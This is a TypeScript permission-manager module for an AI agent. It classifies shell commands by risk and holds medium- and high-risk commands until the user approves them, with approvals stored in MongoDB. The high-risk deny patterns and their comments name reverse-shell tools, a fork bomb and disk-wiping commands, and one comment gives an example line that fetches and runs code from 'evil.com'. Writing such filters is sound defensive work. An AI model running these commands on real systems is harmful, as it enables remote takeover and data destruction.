import "server-only";
import { ObjectId } from "mongodb";
import { getDb, COL } from "@/lib/mongo";

/** Permission Manager: high-risk actions require an explicit, user-owned approval. */
export type Risk = "low" | "medium" | "high";

const LOW = [/^(dir|ls|pwd|cat|type|head|tail|echo|whoami|date|node --version|git (status|log|diff))/i];
const HIGH = [
  /(rm|del|rd|remove-item)\s/i,
  /(curl|wget|invoke-webrequest|iwr)\s/i,
  /git push/i,
  /(format|shutdown|reg |diskpart)/i,
  /npm (publish|uninstall)/i,
  // Обходы гейта «простое редактирование»: интерпретаторы с произвольным кодом.
  /python\d*\s+-c/i,
  /perl\s+-e/i,
  /php\s+-r/i,
  /node\s+-e/i,
  /ruby\s+-e/i,
  // Массовое удаление/изменение прав через find.
  /find\s+.*(-exec|-delete|-ok)/i,
  /chmod|chown|chgrp|rmdir|truncate/i,
  /mkfs|parted|fdisk/i,
  /dd\s+.*of=\/dev/i,
  /mount|umount/i,
  /:\(\s*rm/,
  // Fork-bomb: :(){ :|:& };: — кладёт систему за секунды.
  /:\s*\(\s*\)\s*\{/,
  // Реверс-шеллы и сетевые туннели из песочницы.
  /\/dev\/(tcp|udp)\//i,               // bash TCP/UDP redirect (bash -i >& /dev/tcp/...)
  /\beval\s*\$\s*\(/i,                 // eval + subshell (eval $(curl evil.com/sh))
  /\bnc\b.*(-l|-e|-c)/i,              // netcat слушатель/exec
  /\bsocat\b.*exec:/i,                 // socat реверс-шелл
  /\bpython\d*\s+-m\s+http\.server/i, // открытый HTTP-файл-сервер из папки
  /\bnohup\b.*&\s*$/i,                // отвязка процесса от сессии
];
const PERMISSION_TTL_MS = 5 * 60_000;
const PERMISSION_POLL_MS = 500;
/** «Всегда разрешать» действует ограниченное время, а не вечно. */
const ALWAYS_ALLOW_TTL_MS = 24 * 3600_000;

export function classifyCommand(cmd: string): Risk {
  if (HIGH.some((r) => r.test(cmd))) return "high";
  if (LOW.some((r) => r.test(cmd.trim()))) return "low";
  // Всё, что не входит в явный LOW-список, требует подтверждения учителя:
  // раньше «medium» выполнялось без спроса, и опасные команды в обход
  // паттернов (python -c 'shutil.rmtree', find -delete и т.п.) проходили.
  return "medium";
}

function ownerId(userId: string): ObjectId {
  if (!/^[a-f\d]{24}$/i.test(userId)) throw new Error("Некорректный пользователь агента");
  return new ObjectId(userId);
}

/** This preference is stored per account and survives Worker/Node restarts. */
export async function alwaysAllows(userId: string): Promise<boolean> {
  const row = await (await getDb()).collection(COL.agentPolicies).findOne(
    { user_id: ownerId(userId) },
    { projection: { always_allow_high_risk: 1, always_allow_expires_at: 1 } },
  );
  if (row?.always_allow_high_risk !== true) return false;
  const expiresAt = row.always_allow_expires_at as Date | undefined;
  if (expiresAt && expiresAt.getTime() < Date.now()) return false;
  return true;
}

/** Wait for an approval persisted in Mongo so the agent and UI may hit different isolates. */
export async function requestPermission(userId: string, command: string, risk: Risk): Promise<boolean> {
  // Низкий риск выполняется без подтверждения; всё остальное (medium и high) —
  // только после явного разрешения учителя.
  if (risk === "low" || await alwaysAllows(userId)) return true;

  const db = await getDb();
  const id = new ObjectId();
  const createdAt = new Date();
  const expiresAt = new Date(createdAt.getTime() + PERMISSION_TTL_MS);
  const requests = db.collection(COL.agentPermissionRequests);

  await requests.insertOne({
    _id: id,
    user_id: ownerId(userId),
    command: command.slice(0, 1000),
    risk,
    status: "pending",
    created_at: createdAt,
    expires_at: expiresAt,
  });

  while (Date.now() < expiresAt.getTime()) {
    const request = await requests.findOne(
      { _id: id, user_id: ownerId(userId) },
      { projection: { status: 1 } },
    );
    if (!request || request.status === "denied" || request.status === "expired") return false;
    if (request.status === "allowed") return true;
    await new Promise((resolve) => setTimeout(resolve, PERMISSION_POLL_MS));
  }

  await requests.updateOne(
    { _id: id, user_id: ownerId(userId), status: "pending" },
    { $set: { status: "expired", resolved_at: new Date() } },
  );
  return false;
}

export async function listPending(userId: string): Promise<{ id: string; command: string; risk: Risk; createdAt: number }[]> {
  const rows = await (await getDb()).collection(COL.agentPermissionRequests)
    .find({ user_id: ownerId(userId), status: "pending", expires_at: { $gt: new Date() } })
    .sort({ created_at: 1 })
    .limit(20)
    .toArray();
  return rows.map((row) => ({
    id: row._id.toString(),
    command: String(row.command ?? ""),
    risk: row.risk === "high" ? "high" : "medium",
    createdAt: row.created_at instanceof Date ? row.created_at.getTime() : Date.now(),
  }));
}

/** Resolve once only; stale or already-decided prompts cannot be replayed. */
export async function resolvePermission(userId: string, id: string, allow: boolean, always: boolean): Promise<boolean> {
  if (!/^[a-f\d]{24}$/i.test(id)) return false;
  const db = await getDb();
  const now = new Date();
  const result = await db.collection(COL.agentPermissionRequests).updateOne(
    {
      _id: new ObjectId(id),
      user_id: ownerId(userId),
      status: "pending",
      expires_at: { $gt: now },
    },
    { $set: { status: allow ? "allowed" : "denied", resolved_at: now } },
  );
  if (result.modifiedCount !== 1) return false;

  if (allow && always) {
    await db.collection(COL.agentPolicies).updateOne(
      { user_id: ownerId(userId) },
      {
        $set: {
          always_allow_high_risk: true,
          always_allow_expires_at: new Date(now.getTime() + ALWAYS_ALLOW_TTL_MS),
          updated_at: now,
        },
        $setOnInsert: { created_at: now },
      },
      { upsert: true },
    );
  }
  return true;
}

export async function revokeAlwaysAllow(userId: string): Promise<void> {
  await (await getDb()).collection(COL.agentPolicies).updateOne(
    { user_id: ownerId(userId) },
    { $unset: { always_allow_high_risk: "" }, $set: { updated_at: new Date() } },
  );
}
